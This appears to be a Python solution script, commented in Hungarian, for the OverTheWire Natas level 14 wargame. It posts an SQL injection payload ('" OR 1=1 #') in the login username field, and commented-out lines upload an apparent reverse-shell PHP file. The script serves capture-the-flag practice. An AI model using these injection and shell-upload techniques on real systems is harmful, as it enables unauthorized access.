from urllib import response

#3.9 pythonnal megy!!
import urllib
import requests
import re


username = 'natas14'
password = 'qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP'

url = 'http://%s.natas.labs.overthewire.org/?debug=true' % username

session = requests.Session()
#reponse = session.get(url , auth=(username, password))
#                           File feltöltés post-al                              ezeket az adatokat kell elküldeni, ez látszik a HTML kódból is
#reponse = session.post(url ,files= {"uploadedfile": open('revshell13.php','rb')}, data={ "filename": "revhell13.php", "MAX_FILESIZE": "1000" }, auth=(username, password))

#php futtatása
#reponse = session.get(url , auth=(username, password))
reponse = session.post(url, data= {"username": 'please" OR 1=1 #', "password": "subscribe"}, auth=(username, password))

content = reponse.text

print(content)